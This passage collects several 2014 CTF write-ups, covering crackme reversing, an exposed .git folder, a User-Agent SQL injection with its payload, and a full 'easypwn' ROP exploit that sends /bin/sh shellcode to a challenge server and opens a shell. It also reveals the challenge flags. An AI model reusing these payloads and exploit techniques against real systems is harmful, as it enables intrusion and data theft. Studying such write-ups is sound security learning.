that function. \n\n```bash\ngdb-peda$ b *0x40077f\nBreakpoint 1 at 0x40077f\ngdb-peda$ r bleh\n...\n[-------------------------------------code-------------------------------------]\n   0x400775:\tadd    rdx,0x8\n   0x400779:\tmov    rdx,QWORD PTR [rdx]\n   0x40077c:\tmov    rdi,rdx\n=> 0x40077f:\tcall   rax\n   0x400781:\ttest   eax,eax\n   0x400783:\tje     0x400791\n...\nBreakpoint 1, 0x000000000040077f in ?? ()\n```\n\nThe binary was halted at the `call eax` instruction. I entered `ni` to step into the function. This is where the fun really starts, it is where our string is checked for validity. There's a red herring in there too. The function starts like this:\n\n```\ngdb-peda$ x/40i $rip\n=> 0x7ffff7ff5000:\tpush   rbp\n   0x7ffff7ff5001:\tmov    rbp,rsp\n   0x7ffff7ff5004:\tsub    rsp,0x10\n   0x7ffff7ff5008:\tmov    QWORD PTR [rbp-0x8],rdi\n   0x7ffff7ff500c:\tmov    rax,QWORD PTR [rbp-0x8]\n   # grab first byte of input\n   0x7ffff7ff5010:\tmovzx  eax,BYTE PTR [rax]\t\n   # is it '9'?\n   0x7ffff7ff5013:\tcmp    al,0x39\n   # if so, jump away\n   0x7ffff7ff5015:\tje     0x7ffff7ff5143\t\n   # else:\n   0x7ffff7ff501b:\tmov    rax,QWORD PTR [rbp-0x8] \n   # grab first byte of input\n   0x7ffff7ff501f:\tmovzx  eax,BYTE PTR [rax]\t\n   # is it 'f'?\n   0x7ffff7ff5022:\tcmp    al,0x66\t\t\t\n   # if not, jump away\n   0x7ffff7ff5024:\tjne    0x7ffff7ff5139\t\n   0x7ffff7ff502a:\tmov    rax,QWORD PTR [rbp-0x8]\n   # second byte of input\n   0x7ffff7ff502e:\tadd    rax,0x1\t\t\n   0x7ffff7ff5032:\tmovzx  eax,BYTE PTR [rax]\n   # is it 'l'?\n   0x7ffff7ff5035:\tcmp    al,0x6c\t\n   0x7ffff7ff5037:\tjne    0x7ffff7ff5139\n   0x7ffff7ff503d:\tmov    rax,QWORD PTR [rbp-0x8]\n   # third byte of input\n   0x7ffff7ff5041:\tadd    rax,0x2\n   0x7ffff7ff5045:\tmovzx  eax,BYTE PTR [rax]\n   # is it 'a'?\n   0x7ffff7ff5048:\tcmp    al,0x61\n```\n\nI was all super excited and started to trace the path that started spelling out `flag`, each time adjusting `al` to the value that it was being compared to (in `gdb`, this can be done by executing `set $al=0x66`). However, this path spelled out `flagstartswith9`. In other words, I fell for the red herring. D'oh! The other code path started comparing the input to `9`, so I restarted the binary and entered `9447` as the input. Re-tracing the check-input function, I noticed that the code had changed!\n\n\n```\n# Input 'bleh':\n   0x7ffff7ff5022:\tcmp    al,0x66\t\n# Input '9447'\n   0x7ffff7ff5022:\tcmp    al,0x34\n```\n\nVery fancy. I traced the function further, ending up here:\n\n```\ngdb-peda$ \n[----------------------------------registers-----------------------------------]\nRAX: 0x72 ('r')\n...\n[-------------------------------------code-------------------------------------]\n   0x7ffff7ff5062:\tmovzx  eax,BYTE PTR [rax]\n   0x7ffff7ff5065:\tmovsx  eax,al\n   0x7ffff7ff5068:\tadd    eax,0x39\n=> 0x7ffff7ff506b:\tcmp    edx,eax\n```\n\nThis is the fifth character of the password and seems to be `r`. I did a quick `set $edx=$eax` and moved on. The next bytes were `oll`, so I expected the following check to be for `i`. However, the password function borked, because it was using the first four characters to generate the next four! I had only entered four in total. The name of the binary, `rolling`, makes a bit more sense now :)\n\n```\n# grab eight input byte\n   0x7ffff7ff50c1:\tmov    rax,QWORD PTR [rbp-0x8]\n   0x7ffff7ff50c5:\tadd    rax,0x7\n   0x7ffff7ff50c9:\tmovzx  eax,BYTE PTR [rax]\n=> 0x7ffff7ff50cc:\tmovsx  eax,al\n# grab third input byte...\n   0x7ffff7ff50cf:\tmov    rdx,QWORD PTR [rbp-0x8]\n   0x7ffff7ff50d3:\tadd    rdx,0x3\n   0x7ffff7ff50d7:\tmovzx  edx,BYTE PTR [rdx]\n   0x7ffff7ff50da:\tmovsx  edx,dl\n# ... and add 0x35 to that third byte!\n   0x7ffff7ff50dd:\tadd    edx,0x35\n# compare [3]+0x35 to [7]:\n   0x7ffff7ff50e0:\tcmp    eax,edx\n```\n\nThis meant I just had to re-run the binary once I had four more characters. No problem! Eventually, at each `cmp` execution, I noted the proper byte and the correct input turned out to be `9447rollingisfun`. \n\nThe flag was `9447{9447rollingisfun}`. \n\n\n\n", "timestamp": "2025-10-24T11:40:09.069139"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/9447/tumorous.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/9447/tumorous.md", "content": "### Solved by historypeats\n\n> They are following me. They are after my token. I have to hide it somewhere. I’m not very good at hiding.\n>\n> tumorous.9447.plumbing\n\n##Write Up\n\nWhen we navigate to the URL provided (http://tumorous.9447.plumbing), we can see some timestamped logs claiming that the user is new to git.\n\n```\n3/2/2004: I learned how to html, yay! \n12/4/2004: I learned how to use git, yay! \n13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon. 08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it. \n10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh. \n10/9/2004: I can't forget my token. What do I do? \n11/9/2004: I panicked and deleted the token. It is the work of evil doers. \n12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.\n```\nWhen I see someone new to something, I immediately think a configuration error or some sort of bad practice. In this case, it happened to be a bad practice with exposing their .git folder.\n\nI was able to discover the http://tumorous.9447.plumbing/.git/ folder by running dirb against the host. Manually browsing this directory returned a 403 forbidden error. So it appears that directory indexing was disabled. However, running dirb a second time, using the .git directory as the \"root\", I was able to discover that the http://tumorous.9447.plumbing/.git/index file was available. Knowing that the .git/index file was accessible, I was able to use the rip-git.pl (https://github.com/kost/dvcs-ripper) script to read the index file and download the contents. All that was left was to read the token file.\n\n```\n$ cat token\n9447{IM_SITTING_ON_A_PILE_OF_GOLD}\n```\n", "timestamp": "2025-10-24T11:40:09.210226"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/blacklist.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/blacklist.md", "content": "### Solved by historypeats\n\n> We have stupid blacklist. The flag is in flag table.\n> http://blacklist.adctf2014.katsudon.org/\n\nProvided Source Code:\n```perl\nuse Mojolicious::Lite;\nuse DBI;\n\n# enjoy~\nmy $BLACKLIST_CHAR = qr/['*=]/;\nmy $BLACKLIST_WORD = qr/select|insert|update|from|where|order|union|information_schema/;\n\nmy $dbh = DBI->connect('dbi:mysql:blacklist', 'blacklist', $ENV{BLACKLIST_PASSWORD});\nhelper dbh => sub { $dbh };\n\nget '/' => sub {\n    my $self = shift;\n    my $ip = $self->tx->remote_address;\n    my $agent = $self->req->headers->user_agent;\n    # remove evil comments\n    $agent =~ s!/\\*.*\\*/!!g;\n    # disallow this one\n    die 'no hack' if $agent =~ /\\)\\s*,\\s*\\(/;\n    $self->dbh->do(\n        \"INSERT INTO access_log (accessed_at, agent, ip) VALUES (NOW(), '$agent', '$ip')\"\n    );\n    my $access = $self->dbh->selectall_arrayref(\n        \"SELECT * FROM access_log WHERE ip = '$ip' ORDER BY accessed_at DESC LIMIT 10\",\n        {Slice => {}}\n    );\n    return $self->render('index', ip => $ip, access => $access);\n};\n\nget '/search' => sub {\n    my $self = shift;\n    my $ip = $self->param('ip');\n    $ip =~ s/$BLACKLIST_CHAR//g;\n    $ip =~ s/$BLACKLIST_WORD//g;\n    my $id = $self->param('id');\n    $id =~ s/$BLACKLIST_CHAR//g;\n    $id =~ s/$BLACKLIST_WORD//g;\n    my ($agent) = $self->dbh->selectrow_array(\n        \"SELECT agent FROM access_log WHERE ip = '$ip' AND id = '$id'\",\n        {Slice => {}}\n    );\n    if ($agent) {\n        $agent =~ s/$BLACKLIST_CHAR//g;\n        $agent =~ s/$BLACKLIST_WORD//g;\n        my $access = $self->dbh->selectall_arrayref(\n            \"SELECT * FROM access_log WHERE ip = '$ip' AND agent LIKE '$agent' ORDER BY accessed_at DESC LIMIT 10\",\n            {Slice => {}}\n        );\n        return $self->render('search', agent => $agent, access => $access);\n    } else {\n        return $self->render_not_found;\n    }\n};\n\nget '/source' => sub {\n    my $self = shift;\n    my $src = do {\n        open my $fh, '<', __FILE__ or die $!;\n        local $/; <$fh>;\n    };\n    return $self->render(text => $src, format => 'txt');\n};\n\napp->start;\n\n__DATA__\n@@ index.html.ep\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\" />\n    <title>blacklist</title>\n</head>\n<body>\n    <p>sqli, sqli, sqli~~~ we have blacklist. see <a href=\"/source\">source</a>.</p>\n    <h2><%= stash 'ip' %>:</h3>\n    <ul>\n    % my $access = stash 'access';\n    % for (@$access) {\n        <li>[<%= $_->{accessed_at} %>] \"<%= $_->{agent} %>\" <a href=\"<%== url_for('/search')->query(ip => $_->{ip}, id => $_->{id}) %>\">search</a></li>\n    % }\n    </ul>\n</body>\n</html>\n\n@@ search.html.ep\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\" />\n    <title>blacklist</title>\n</head>\n<body>\n    <h2>search with \"<%= stash 'agent' %>\"</h3>\n    <ul>\n    % for (@$access) {\n        <li>[<%= $_->{accessed_at} %>] \"<%= $_->{agent} %>\"</li>\n    % }\n    </ul>\n</body>\n</html>\n\n@@ not_found.html.ep\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\" />\n    <title>not found</title>\n    <style>body{font-size:64px;}</style>\n</head>\n<body>\n    <pre>             _      __                       _\n _ __   ___ | |_   / _| ___  _   _ _ __   __| |\n| '_ \\ / _ \\| __| | |_ / _ \\| | | | '_ \\ / _` |\n| | | | (_) | |_  |  _| (_) | |_| | | | | (_| |_ _ _\n|_| |_|\\___/ \\__| |_|  \\___/ \\__,_|_| |_|\\__,_(_|_|_)</pre>\n</body>\n</html>\n\n```\n\nHere we have a SQL injection challenge that relies on a blacklist filter to prevent attackers. As we all know, blacklist filters are terrible when it comes to protecting SQL queries and the proper method would be to use parameterized queries.\n\nLooking at the code, we are able to inject arbitrary SQL into the \"INSERT INTO\" query via the User-Agent of the request and have the data returned to us in the subsequent \"SELECT\" query. The \"INSERT INTO\" query is performed whenever a new request to the index of the page (http://blacklist.adctf2014.katsudon.org/) is made, taking the User-Agent and IP address of the request and inserting it into the database. Additionally, we are allowed to use single-quotes in our injection, which allows us to break out of the query and perform our own SQL statements.\n\nIn order to exploit this SQL injection, I used the following base injection in the User-Agent of the request: \n\n```\nhai2' + (ord(substring((select * from flag limit 1),1,1))),'38.86.162.36');#\n```\n\nNow to explain what this does, it basically reads the first character of the flag and converts it to it's ASCII decimal equivalent. Then it performs an addition operation with the string 'hai2'. Performing an addition operation between a string and number will return the number. Therefore, the \"INSERT INTO\" query will be writing the ASCII decimal value of the first letter of the flag.\n\nThe response to this request returns the following snippet:\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\" />\n    <title>blacklist</title>\n</head>\n<body>\n    <p>sqli, sqli, sqli~~~ we have blacklist. see <a href=\"/source\">source</a>.</p>\n    <h2>38.86.162.36:</h3>\n    <ul>\n        <li>[2014-12-17 06:34:42] \"65\" <a href=\"/search?ip=38.86.162.36&id=42980\">search</a></li>\n\n```\n\nWe can see that \"65\" is returned. \"65\" is the decimal equivalent of the letter \"A\". Now all we need to do is increment substring number until we succesfully enumerate the entire flag.\n\nAfter a quick script, the following python script is used to convert the decimal values returned:\n```python\n\nx = [65, 68, 67, 84, 70, 95, 100, 48, 95, 78, 111, 84, 95, 85, 115, 51, 95, 70, 85, 99, 75, 49, 78, 95, 56, 108, 52, 99, 107, 76, 49, 115, 84]\nword = ''\n\nfor i in x:\n    word += chr(i)\n\nprint word\n```\n\nFlag: ADCTF_d0_NoT_Us3_FUcK1N_8l4ckL1sT\n", "timestamp": "2025-10-24T11:40:09.487547"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/bruteforce.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/bruteforce.md", "content": "### Solved by barrebas\n\nBruteforce they said, it'll be fun, they said...\n\nWe're given only a binary and are told that we shouldn't bruteforce the server. The binary, when started, only says \"calculating.....\" and not much else. Upon closer examination, I found that it does some calculations and checks a certain number before printing out the flag:\n\n\n```\n   0x400703:    movsxd rax,DWORD PTR [rsp+0x8]\n=> 0x400708:    cmp    rax,QWORD PTR [rip+0x200969]        # 0x601078\n   0x40070f:    je     0x400780\n   0x400711:    add    DWORD PTR [rsp+0xc],0x1\n```\n\nIf `eax` matches the value at `0x601078`, then the code jumps here:\n\n```\n  400780:   8b 54 24 0c             mov    edx,DWORD PTR [rsp+0xc]\n  400784:   be b1 09 40 00          mov    esi,0x4009b1 ; bruteforce : 0x4009b1 (\"the flag is: ADCTF_%d\\n\")\n  400789:   bf 01 00 00 00          mov    edi,0x1\n  40078e:   31 c0                   xor    eax,eax\n  400790:   e8 7b fe ff ff          call   400610 <__printf_chk@plt>\n```\n\nSo the calculates until a certain value is found and then dumps the flag. I found a couple of rate-limiting things, such as these syscalls:\n\n```\n  4008e0:   49 89 ce                mov    r14,rcx\n  4008e3:   48 89 fa                mov    rdx,rdi\n  4008e6:   4c 89 d7                mov    rdi,r10\n  4008e9:   4c 89 ce                mov    rsi,r9\n  4008ec:   48 31 c0                xor    rax,rax\n  4008ef:   b0 23                   mov    al,0x23  ; nanosleep\n  4008f1:   0f 05                   syscall \n```\n\nI didn't want to slow it down so I nop'ed out three of those syscalls, along with the calls to putchar and printf. I ran the binary, occasionaly checking at which it was... but it still was very slow! Time for a different approach...\n\nRunning the binary and breaking at the comparison at `0x400708`, I compared the value at `rsp+0x8` and `rsp+0xc` (which is used to print out the flag eventually). I noticed these numbers:\n\n```\nrsp+0x8     rsp+0xc\n-------------------\n    1           1\n    2           2\n    3           5\n    4           7\n    5           11\n```\n\nIt didn't take me long to realize we're looking at prime numbers here. This binary bruteforces prime numbers and prints out the prime number when the comparison at `0x400708` is true. `eax` contains the ordinal number of the last prime found and is compared to `0x989680`. That would be 10,000,000 in decimal. I quickly located a list of [prime numbers](https://primes.utm.edu/lists/small/millions/) and found the 10th million: 179,424,673. \n\nTherefore, the flag was: `ADCTF_179424673`. \n\n", "timestamp": "2025-10-24T11:40:09.592118"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/easy-one.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/easy-one.md", "content": "### Solved by bitvijays\nIn this reversing challenge, we are provided with the binary which when executed requests for the password.\n\n>This is very easy crackme.\n\n```\nbitvijays@kali:~/Desktop/Advent$ ./easyone \npassword: test\nwrong\n```\n\nRunning this executable in gdb-peda and diassembling the main function, we see that it has cmp command at main+195. Let's put a breakpoint at it and check the stack.\n\n```\nbitvijays@kali:~/Desktop/Advent$ gdb -q easyone\nReading symbols from /home/bitvijays/Desktop/Advent/easyone...(no debugging symbols found)...done.\ngdb-peda$ pdisass main\nDump of assembler code for function main:\n**Snip**\n   0x000000000040069a <+173>:\tmov    BYTE PTR [rbp-0x2f],0x44\n   0x000000000040069e <+177>:\tmov    BYTE PTR [rbp-0x13],0x0\n   0x00000000004006a2 <+181>:\tmov    rax,QWORD PTR [rbp-0x8]\n   0x00000000004006a6 <+185>:\tmovzx  edx,BYTE PTR [rax]\n   0x00000000004006a9 <+188>:\tmov    rax,QWORD PTR [rbp-0x10]\n   0x00000000004006ad <+192>:\tmovzx  eax,BYTE PTR [rax]\n   0x00000000004006b0 <+195>:\tcmp    dl,al\n   0x00000000004006b2 <+197>:\tje     0x4006c5 <main+216>\n   0x00000000004006b4 <+199>:\tmov    edi,0x4007a4\nEnd of assembler dump.\n**Snip**\ngdb-peda$ br *main+195\nBreakpoint 1 at 0x4006b0\ngdb-peda$ run\npassword: hello\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe1e0 --> 0x6f6c6c6568 ('hello')\n0008| 0x7fffffffe1e8 --> 0x1 \n0016| 0x7fffffffe1f0 --> 0x1 \n0024| 0x7fffffffe1f8 --> 0x40075d (<__libc_csu_init+77>:\tadd    rbx,0x1)\n0032| 0x7fffffffe200 (\"ADCTF_7H15_15_7oO_345y_FOR_M3\")\n0040| 0x7fffffffe208 (\"15_15_7oO_345y_FOR_M3\")\n0048| 0x7fffffffe210 (\"O_345y_FOR_M3\")\n0056| 0x7fffffffe218 --> 0x334d5f524f ('OR_M3')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x00000000004006b0 in main ()\n```\n\n***The Flag is ADCTF_7H15_15_7oO_345y_FOR_M3***\n", "timestamp": "2025-10-24T11:40:09.677494"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/easypwn.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/easypwn.md", "content": "### Solved by barrebas\n\nAnother pwnable, named \"easypwn\", no less! Should be a walk in the park, right? Of course, it turns out it wasn't! We're given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in `/home/easypwn/flag`. Great! Disassembling the binary leads to the following code:\n\n```bash\nbas@tritonal:~/adventctf$ objdump -d easypwn -M intel\n\neasypwn:     file format elf32-i386\n\n\nDisassembly of section .text:\n\n08048080 <syscall>:\n 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]\n 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]\n 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]\n 804808c:   cd 80                   int    0x80\n 804808e:   c3                      ret    \n 804808f:   90                      nop\n\n08048090 <pwn_me>:\n 8048090:   83 ec 10                sub    esp,0x10\n 8048093:   b9 ed 80 04 08          mov    ecx,0x80480ed\n 8048098:   b8 04 00 00 00          mov    eax,0x4          # write\n 804809d:   6a 08                   push   0x8\n 804809f:   51                      push   ecx\n 80480a0:   6a 01                   push   0x1              # stdout\n 80480a2:   ff d6                   call   esi\n 80480a4:   83 c4 0c                add    esp,0xc\n 80480a7:   89 e1                   mov    ecx,esp\n 80480a9:   b8 03 00 00 00          mov    eax,0x3          # read\n 80480ae:   68 80 00 00 00          push   0x80             # 128 bytes\n 80480b3:   51                      push   ecx\n 80480b4:   6a 00                   push   0x0              # stdin\n 80480b6:   ff d6                   call   esi\n 80480b8:   83 c4 0c                add    esp,0xc\n 80480bb:   83 c4 10                add    esp,0x10\n 80480be:   c3                      ret    \n 80480bf:   90                      nop\n\n080480c0 <_start>:\n 80480c0:   56                      push   esi\n 80480c1:   be 80 80 04 08          mov    esi,0x8048080\n 80480c6:   e8 c5 ff ff ff          call   8048090 <pwn_me>\n 80480cb:   b9 f6 80 04 08          mov    ecx,0x80480f6\n 80480d0:   b8 04 00 00 00          mov    eax,0x4          # write\n 80480d5:   6a 13                   push   0x13             # 0x13 bytes\n 80480d7:   51                      push   ecx\n 80480d8:   6a 01                   push   0x1              # stdout\n 80480da:   ff d6                   call   esi\n 80480dc:   83 c4 0c                add    esp,0xc\n 80480df:   b8 01 00 00 00          mov    eax,0x1          # exit\n 80480e4:   6a 00                   push   0x0\n 80480e6:   ff d6                   call   esi\n 80480e8:   83 c4 04                add    esp,0x4\n 80480eb:   5e                      pop    esi\n 80480ec:   c3                      ret    \n```\n\nThat's not a whole lot to work with. Running it gives a clue on what to do:\n\n```bash\nbas@tritonal:~/adventctf$ ulimit -c unlimited\nbas@tritonal:~/adventctf$ ./easypwn\npwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\nSegmentation fault (core dumped)\nbas@tritonal:~/adventctf$ gdb ./easypwn core\n...snip...\nCore was generated by './easypwn'.\nProgram terminated with signal 11, Segmentation fault.\n#0  0x45454545 in ?? ()\ngdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : disabled\n```\n\nOK, so it's a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at `0x08048080`. Looks easy, right? Wrong! \n\nThere is one **big** problem:\n\n```bash\n08048080 <syscall>:\n 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]\n 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]\n 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]\n 804808c:   cd 80                   int    0x80\n 804808e:   c3                      ret    \n 804808f:   90                      nop\n```\n\nWe have *no way* to set `eax`! The `eax` register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to [ropshell.com](https://ropshell.com) but I found no straightforward way to set `eax`. I'd prefer a `mov eax` or `pop eax`, or even `sub eax` or `xor eax`. Anything, really! I dumped the ROP gadgets with [my own tool](https://gist.github.com/barrebas/4fc86eaf0e9b124813a3) and found this little gadget:\n\n```\nRET: 0x80480e9: les eax, [esi+ebx*2]; ret;\n```\n\nNow this is a strange way to set `eax`. The `les` operand does the following: it loads the 48-bit value at the location of `esi+ebx*2` and sets `eax` to the first 32 bits and the `es` register to the last 16 bits. *However*, `es` does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: `0x0000000i, 0x0000`. This would load 0xi in `eax` and 0x0 in `es`.\n\nIt seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I'd have no idea of knowing where the stack is. Instead, I went with a different strategy. \n\nI am going to use the syscall `mprotect` to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall `read` to read in any shellcode from stdin to the code section. Finally, I simply return to that region. \n\nA problem here is that I can't set `eax` to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: `read`! The return value of that syscall will be the number of bytes read... If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in `eax`!\n\nHere's what I came up with, bit by bit. I started the binary via socat, to emulate the target system: \n\n```bash\nbas@tritonal:~/adventctf$ socat TCP-LISTEN:28099,fork EXEC:./easypwn\n```\n\nAnd this is the ROP chain I built:\n\n```python\n#!/usr/bin/python\n\nimport struct\nimport socket\nimport telnetlib\n\nSYSCALL = 0x8048080\nPOPRET = 0x80480eb  # pop esi; ret\nADDESP = 0x80480bb  # add esp, 0x10; ret\nLESEAX = 0x80480e9  # les eax,FWORD PTR [esi+ebx*2]\n\ndef p(x):\n  return struct.pack(\"<L\", x)\n\npayload = \"\"\n\npayload += \"A\"*16       # smash stack!\n\npayload += p(SYSCALL)   # I rely on the return value of the read syscall\npayload += p(ADDESP)    # fix stack with add esp, 10; ret\npayload += p(0x8048000) # address to modify\npayload += p(0x1000)    # length (page-aligned!)\npayload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC\npayload += \"AAAA\"       # dummy value\n\n# reset ebx so we can set eax using the next gadget\npayload += p(SYSCALL)\npayload += p(ADDESP)\npayload += p(0)         # set ebx = 0\npayload += p(0x1000)    # don't care\npayload += p(0x7)       # don't care\npayload += \"AAAA\"       # dummy\n\n# set eax = 3\n# 0x804834a:    0x00000003  0x00000000\npayload += p(POPRET)    # pop esi; ret\npayload += p(0x804834a) # set esi = 0x804834a\npayload += p(LESEAX)    # eax -> 0x3 == syscall_read\n\npayload += p(SYSCALL)\npayload += p(ADDESP)    # fix stack\npayload += p(0)         # stdin\npayload += p(0x8048000) # address of buffer\npayload += p(0x200)     # number of bytes to read\npayload += \"BBBB\"       # dummy value\n\npayload += p(0x8048000) # return to shellcode!\n\n# payload length must be 125, because after read, the next\n# syscall is mprotect; eax = 125\npayload += \"A\"*(125-len(payload))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n#s.connect((\"localhost\",28099))\ns.connect((\"pwnable.katsudon.org\",28099))\n\ns.send(payload)\n\n# http://www.shell-storm.org/shellcode/files/shellcode-851.php\ns.send(\"\\x31\\xc9\\xf7\\xe9\\x51\\x04\\x0b\\xeb\\x08\\x5e\\x87\\xe6\\x99\\x87\\xdc\\xcd\\x80\\xe8\\xf3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\")\n\n# the shell should have been spawned, so interact with it\nt = telnetlib.Telnet()\nt.sock = s\nt.interact()\n```\n\nThis first bit of python sets up the exploit. I have a helper function called `p(x)` that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that `eax` will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:\n\n```python\npayload += p(SYSCALL)   # I rely on the return value of the read syscall\npayload += p(ADDESP)    # fix stack with add esp, 10; ret\npayload += p(0x8048000) # address to modify\npayload += p(0x1000)    # length (page-aligned!)\npayload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC\npayload += \"AAAA\"       # dummy value\n```\n\nThis will call `syscall(0x8048000, 0x1000, 0x7)` with `eax` set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that `eax` must be 3. I first reset `ebx`:\n\n```python\n# reset ebx so we can set eax using the next gadget\npayload += p(SYSCALL)\npayload += p(ADDESP)\npayload += p(0)         # set ebx = 0\npayload += p(0x1000)    # don't care\npayload += p(0x7)       # don't care\npayload += \"AAAA\"       # dummy\n```\n\nWhatever this syscall is (I don't know the value of `eax` after the mprotect call, nor do I care), it fails but the side-effect is that `ebx` is now 0. That sets us up for moving the correct number in `eax`:\n\n```python\n# set eax = 3\n'''\n0x804834a:  0x00000003  0x00000000\n'''\npayload += p(POPRET)    # pop esi; ret\npayload += p(0x804834a) # set esi = 0x804834a\npayload += p(LESEAX)    # eax -> 0x3 == syscall_read\n```\n\nFirst, I use a `pop esi; ret` gadget to set the value of `esi` to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set `eax` (and `es`) using those values. This results in `eax` being the correct number for the next syscall, read:\n\n```python\npayload += p(SYSCALL)\npayload += p(ADDESP)    # fix stack\npayload += p(0)         # stdin\npayload += p(0x8048000) # address of buffer\npayload += p(0x200)     # number of bytes to read\npayload += \"BBBB\"       # dummy value\n\npayload += p(0x8048000)\n```\n\nThis reads in `0x200` bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:\n\n```python\n# payload length must be 125, because after read, the next\n# syscall is mprotect; eax = 125\npayload += \"A\"*(125-len(payload))\n```\n\nBecause I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.\n\n```python\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n#s.connect((\"localhost\",28099))\ns.connect((\"pwnable.katsudon.org\",28099))\n\ns.send(payload)\n```\n\nAfter finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I'd better send that over quickly!\n\n```python\n# http://www.shell-storm.org/shellcode/files/shellcode-851.php\ns.send(\"\\x31\\xc9\\xf7\\xe9\\x51\\x04\\x0b\\xeb\\x08\\x5e\\x87\\xe6\\x99\\x87\\xdc\\xcd\\x80\\xe8\\xf3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\")\n\n# the shell should have been spawned, so interact with it\nt = telnetlib.Telnet()\nt.sock = s\nt.interact()\n```\n\nThe shellcode is sent over; the ROP chain will read it at `0x8048000`, return to it and execute `/bin/sh`. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!\n\n```bash\nbas@tritonal:~/adventctf$ python exploit_easy.py \npwn me:\nid\nuid=1000(easypwn) gid=1000(easypwn) groups=1000(easypwn)\ncat /home/easypwn/flag\nADCTF_175_345y_7o_cON7ROL_5Y5c4LL\n```\n\nThe flag was `ADCTF_175_345y_7o_cON7ROL_5Y5c4LL`. \n\n", "timestamp": "2025-10-24T11:40:09.805115"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/listen.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/listen.md", "content": "### Solved by bitvijays\n\nThis Misc challenge provides you a wav file.\n\n>I couldn't listen it, can you?\n\nPlaying the file with any GUI player resulted in the hanging of the application. So, we tried to play the file using a commandline player cvlc which gave us the hint what might be wrong.\n``` plain\nbitvijays@kali:~/Desktop/Advent$ cvlc listen.wav \nVLC media player 2.0.3 Twoflower (revision 2.0.2-93-g77aa89e)\n[0x7f3b6c004768] dummy interface: using the dummy interface module...\n[0xaac8e8] main audio output error: too low audio sample frequency (1)\n[0xa9cb38] main decoder error: failed to create audio output\n```\nChecking for the listen.wav headers and WAV file headers.\n\n```\nbitvijays@kali:~/Desktop/Advent$ hexdump -C listen.wav | more \n00000000  52 49 46 46 6e 02 05 00  57 41 56 45 66 6d 74 20  |RIFFn...WAVEfmt |\n00000010  10 00 00 00 01 00 01 00  01 00 00 00 44 ac 00 00  |........\"V..D...|\n00000020  02 00 10 00 64 61 74 61  4a 02 05 00 00 00 00 00  |....dataJ.......|\n```\n\n![](/images/2014/advent/wave-bytes.gif)\n\nIf we see everything is more or less correct but the sample rate is 01 00, which as suggested by vlc is too low audio sample frequency. Changing it to \"22 56\" i.e 22050 and playing it gives us the flag.\n```\nbitvijays@kali:~/Desktop/Advent$ hexdump -C listen.wav | more \n00000000  52 49 46 46 6e 02 05 00  57 41 56 45 66 6d 74 20  |RIFFn...WAVEfmt |\n00000010  10 00 00 00 01 00 01 00  22 56 00 00 44 ac 00 00  |........\"V..D...|\n00000020  02 00 10 00 64 61 74 61  4a 02 05 00 00 